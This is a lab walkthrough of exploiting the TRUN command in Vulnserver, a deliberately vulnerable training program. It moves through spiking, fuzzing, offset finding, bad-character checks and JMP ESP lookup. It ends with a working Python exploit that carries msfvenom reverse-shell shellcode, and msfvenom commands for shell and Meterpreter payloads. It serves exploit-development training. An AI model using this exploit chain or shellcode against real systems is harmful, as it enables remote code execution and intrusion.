# Vuln Server


Vulnserver is a 32 bit application vulnerable to buffer overflow. I will be overlflowing the `TRUN` command as it's easy to do as compared with the rest of the commands availabe in vuln server binary.

<img src="https://i.imgur.com/yp1SZfl.png"/>

## Steps required to overflow

Steps involved to perform buffer overflow on this program are 

## Spiking 

Spiking is about  trying to overflow every parameter we can find in the program and send large number of input to see if the program crashes on a specific variable

To do this we can use `generic_send_tcp` to spike on variables and for that we need to create our script to overflow the variables

```bash
s_readline(); # read the banner
s_string("variable "); # specify the variable
s_string_variable("input") # specify input for the variable
```

On windows machine let the `vulnserver.exe` run and we'll try to spike the `STATS` variable

<img src="https://i.imgur.com/rQPcmeA.png"/>

<img src="https://i.imgur.com/YbVmNmh.png"/>

```bash
generic_send_tcp 192.168.1.8 9999 ./spike.spk 0 
```

Here this local IP might be diffenrent but the port will remain same for this executable

<img src="https://i.imgur.com/CNUPBOv.png"/>

<img src="https://i.imgur.com/XcMR6K2.png"/>

Is says done but the program didn't crash it's still listening for connections. After trying  `RTIME`,`LTIME` and `SRUN` commands, with `TRUN` being provided with a large number of input the program will be crashed

```bash
s_readline(); 
s_string("TRUN ");
s_string_variable("0");
```

<img src="https://i.imgur.com/7r18CAR.png"/>

We know now that `TRUN` is vulnerable to buffer overflow but we need to find the exact address where the overflow happened this is where Fuzzing comes in


## Fuzzing

Looking at immunity debugger when attempting to crash the program we can see `/.:/` after TRUN command which is then followed by a bunch of A's

<img src="https://i.imgur.com/QUnitwB.png"/>

So we need to supply `/.:/` after TRUN command with the python script to fuzz for the variable to find at how many bytes the variable gets overflown

```python
#!/usr/bin/python

import socket


host = "192.168.1.9"
port = 9999


buffer = "A" * 5000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send("TRUN /.:/" + buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()
```

After running this with python2 we are going to see the same crash as we saw with generic_tcp_send

<img src="https://i.imgur.com/9tPbore.png"/>

## Finding the Offset

But here's an issue, we don't really know at what point the binary crashed as we have sent a buffer of 5000 bytes as it's difficult to indentify with the A's we are sending which results to `EIP` to be overflow with `414141` which means A's

We can try to generate a random pattern of characters using metasploit's `msf_pattern_create`

```bash
msf-pattern_create -l 5000
```

Here with `-l` we are specfiying the length of the pattern, as we used 5000 bytes to overflow the buffer, we are going to stick with it

<img src="https://i.imgur.com/UG1ZWXu.png"/>

Replacing the current buffer with this generated pattern

<img src="https://i.imgur.com/vRVB4fi.png"/>

Looking at the immunity debugger, this time we don't get 414141 in the EIP instead we get 386F4337 which is due to the result of random pattern of strings

<img src="https://i.imgur.com/S6kiU0M.png"/>

Now we need to find the offset through this value, with `msf-pattern_offset` which can locate the offset by supplying it the address value

```bash
 msf-pattern_offset -q 386F4337
```

<img src="https://i.imgur.com/RIRlFIx.png"/>

This tells that it found a match at `2003` offset, which means this is the point where the crash happened, to modify our buffer payload we need to send `A *2003` which will cause an overflow and to overwrite the EIP we can maybe overwrite it with `D*4`

<img src="https://i.imgur.com/7eLaynG.png"/>

After running this script we can see EIP is filled with 4 D's (444444 is hexadecimal representation of DDDD)

<img src="https://i.imgur.com/3B78FvK.png"/>

<img src="https://i.imgur.com/cAVSLv5.png"/>


## Identifiying Bad Characters

In a buffer overflow it's necessary to identify characters which aren't allowed by the application but in this binary doesn't have any restrictions for the characters except for `\x00` which is a NULL character considered as a bad character

https://github.com/cytopia/badchars


<img src="https://i.imgur.com/qo7eHUh.png"/>

Add these bad characters in our script 

<img src="https://i.imgur.com/fTLKgG4.png"/>

After sending this input, in `ESP` register which stack pointer which holds the input we can right and `Follow the dump` which will show us that all characters were sent 

<img src="https://i.imgur.com/SCmn5AI.png"/>

<img src="https://i.imgur.com/qBLCHO5.png"/>

If there were any bad characters, there should have been some characters missing like ,`01` could have been missing which would indicate that it's a bad character but in this case there are no bad characters

## Finding Jump Instruction 

Now we need to find the jump instruction `JMP` which is telling the stack to go jump to an address, we need to find address of this instruction so that we can make the stack jump to our instruction for calling a reverse shell

For finding the jmp instruction we can use a python script called `mona` 

https://github.com/corelan/mona

Thi script can loaded by placing it in Immunitiy debugger's `PyCommands` and can be loaded with `!mona`

<img src="https://i.imgur.com/8S8Nfp3.png"/>

For finding jmp instructions we can use this command

```
!mona jmp -r esp
```

<img src="https://i.imgur.com/F0KHj5U.png"/>

We can use any of these jmp instruction, I'll be using the first one which is `0x625011af`


## Getting a reverse shell

We have everything we need, just need to generate a 32 bit windows reverse shell payload 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=2222 -f python -b "\x00"
```

Here `-b` is for specifying which bytes we don't want in our payload to avoid including bad characters

<img src="https://i.imgur.com/6CV8TJZ.png"/>

Now just start a netcat listener and run the python script

```python
#!/usr/bin/python

import socket


host = "192.168.0.113"
port = 9999

buf =  b""
buf += b"\xd9\xed\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbb\xd1"
buf += b"\xcc\x6b\x5c\x83\xea\xfc\x31\x5a\x13\x03\x8b\xdf\x89"
buf += b"\xa9\xd7\x08\xcf\x52\x27\xc9\xb0\xdb\xc2\xf8\xf0\xb8"
buf += b"\x87\xab\xc0\xcb\xc5\x47\xaa\x9e\xfd\xdc\xde\x36\xf2"
buf += b"\x55\x54\x61\x3d\x65\xc5\x51\x5c\xe5\x14\x86\xbe\xd4"
buf += b"\xd6\xdb\xbf\x11\x0a\x11\xed\xca\x40\x84\x01\x7e\x1c"
buf += b"\x15\xaa\xcc\xb0\x1d\x4f\x84\xb3\x0c\xde\x9e\xed\x8e"
buf += b"\xe1\x73\x86\x86\xf9\x90\xa3\x51\x72\x62\x5f\x60\x52"
buf += b"\xba\xa0\xcf\x9b\x72\x53\x11\xdc\xb5\x8c\x64\x14\xc6"
buf += b"\x31\x7f\xe3\xb4\xed\x0a\xf7\x1f\x65\xac\xd3\x9e\xaa"
buf += b"\x2b\x90\xad\x07\x3f\xfe\xb1\x96\xec\x75\xcd\x13\x13"
buf += b"\x59\x47\x67\x30\x7d\x03\x33\x59\x24\xe9\x92\x66\x36"
buf += b"\x52\x4a\xc3\x3d\x7f\x9f\x7e\x1c\xe8\x6c\xb3\x9e\xe8"
buf += b"\xfa\xc4\xed\xda\xa5\x7e\x79\x57\x2d\x59\x7e\x98\x04"
buf += b"\x1d\x10\x67\xa7\x5e\x39\xac\xf3\x0e\x51\x05\x7c\xc5"
buf += b"\xa1\xaa\xa9\x4a\xf1\x04\x02\x2b\xa1\xe4\xf2\xc3\xab"
buf += b"\xea\x2d\xf3\xd4\x20\x46\x9e\x2f\xa3\xa9\xf7\x2f\x41"
buf += b"\x42\x0a\x2f\xad\x3c\x83\xc9\xc7\x50\xc2\x42\x70\xc8"
buf += b"\x4f\x18\xe1\x15\x5a\x65\x21\x9d\x69\x9a\xec\x56\x07"
buf += b"\x88\x99\x96\x52\xf2\x0c\xa8\x48\x9a\xd3\x3b\x17\x5a"
buf += b"\x9d\x27\x80\x0d\xca\x96\xd9\xdb\xe6\x81\x73\xf9\xfa"
buf += b"\x54\xbb\xb9\x20\xa5\x42\x40\xa4\x91\x60\x52\x70\x19"
buf += b"\x2d\x06\x2c\x4c\xfb\xf0\x8a\x26\x4d\xaa\x44\x94\x07"
buf += b"\x3a\x10\xd6\x97\x3c\x1d\x33\x6e\xa0\xac\xea\x37\xdf"
buf += b"\x01\x7b\xb0\x98\x7f\x1b\x3f\x73\xc4\x2b\x0a\xd9\x6d"
buf += b"\xa4\xd3\x88\x2f\xa9\xe3\x67\x73\xd4\x67\x8d\x0c\x23"
buf += b"\x77\xe4\x09\x6f\x3f\x15\x60\xe0\xaa\x19\xd7\x01\xff"


buffer = "A" * 2003  + "\xaf\x11\x50\x62" + "\x90" * 28 + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send("TRUN /.:/" + buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()
```

<img src="https://i.imgur.com/FMAeUQY.png"/>

If we want we can get a meterpreter shell as well 

<img src="https://i.imgur.com/FXnBGPI.png"/>

<img src="https://i.imgur.com/0pJM0tl.png"/>

But we won't able to get a cmd shell as the vulnserver process will be terminated so we need to use `EXITFUNC=thread` in our payload

<img src="https://i.imgur.com/EzxR6Zn.png"/>

<img src="https://i.imgur.com/8OMLNIn.png"/>

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=2222  EXITFUNC=thread -f python -b "\x00" 
```

<img src="https://i.imgur.com/Nso6T3H.png"/>

## References

- https://null-byte.wonderhowto.com/how-to/hack-like-pro-build-your-own-exploits-part-3-fuzzing-with-spike-find-overflows-0162789/
- https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/
- https://anubissec.github.io/Vulnserver-Exploiting-TRUN-Vanilla-EIP-Overwrite/#
- https://stackoverflow.com/questions/56514355/how-to-overwrite-an-address-with-x00
- https://blog.certcube.com/oscp-msfvenom-all-in-one-cheatsheet/
- https://learn.security10x.com/exploitation-basics/stages-vs.-non-staged-payloads
